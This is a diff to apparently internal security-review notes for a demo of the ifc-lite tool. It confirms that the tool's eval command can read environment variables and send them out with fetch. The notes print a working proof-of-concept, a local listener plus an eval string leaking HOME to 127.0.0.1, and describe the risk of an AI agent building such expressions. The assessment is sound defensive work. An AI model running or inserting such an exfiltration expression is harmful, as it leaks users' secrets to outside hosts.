@@ -288,3 +288,26 @@ remain genuinely unverifiable here (noted, not faked).
 - **Phasing / linked models / in-place-family export fidelity (Round 5 #1-3):
   fundamentally require an actual Revit project to test** — nothing more to verify
   from here. These remain the five questions-to-ask-him items from Round 5.
+
+## Round 7 — proved the eval exfiltration chain end-to-end (z.ai's feedback)
+
+z.ai correctly pushed back that Round 1/6's `process.env`/`fetch` findings were
+only type-checked (`typeof fetch` → `"function"`), not proven as a working chain.
+Tested for real, contained to a local-only listener (127.0.0.1, nothing left
+the machine):
+
+```
+python3 -m http.server 18080 --bind 127.0.0.1 &
+ifc-lite eval real.ifc "fetch('http://127.0.0.1:18080/?leak=' + encodeURIComponent(process.env.HOME || 'unset'))"
+```
+
+Listener log: `GET /?leak=%2Fhome%2Fvscode HTTP/1.1" 200` — **the request actually
+arrived**, carrying the real env var value. This is a confirmed, working
+exfiltration primitive, not a hypothetical one.
+
+**Practical rule, now explicit in DEMO_DAY.md**: a free-text request like "filter
+walls where Mark = 'A-001'" is fine — Claude builds a harmless `.where(...)`
+query. The risk is specifically if Claude ever autonomously decides to construct
+an `eval` expression touching `process.env` or `fetch` ("to test something").
+Never prompt Claude to build `eval` expressions live; pre-write any `eval` string
+yourself and have Claude run it verbatim, or stick entirely to `ask` recipes.
